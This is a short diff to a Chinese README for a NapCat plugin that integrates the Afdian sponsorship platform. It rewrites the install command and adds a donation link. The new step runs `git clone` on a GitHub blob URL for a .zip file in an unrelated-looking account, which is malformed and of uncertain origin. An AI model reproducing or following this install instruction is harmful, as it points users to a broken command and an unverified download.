@@ -38,8 +38,8 @@
 将本项目放入 NapCat 的插件目录中：
 
 ```bash
-cd /path/to/napcat/plugins
-git clone https://github.com/your-username/napcat-plugin-afdian.git AfdianNap
+cd napcat/plugins
+git clone https://github.com/18848298290-del/Napcat-plugin-afdian/blob/main/napcat-plugin-afdian.zip
 ```
 
 确保目录结构如下：
@@ -152,6 +152,11 @@ Web 管理面板提供以下 API 接口（需 Bearer Token 认证）：
 - **依赖**：`napcat-types` 0.0.16
 - **无外部 HTTP 库**：使用 NapCat 内置路由系统
 - **存储**：内存存储（重启后历史记录和去重缓存清空）
+
+## 💜 支持开发者
+
+如果你觉得这个插件对你有帮助，欢迎去爱发电支持一下：
+https://www.ifdian.net/a/FengLan1201
 
 ## 📄 许可证
 
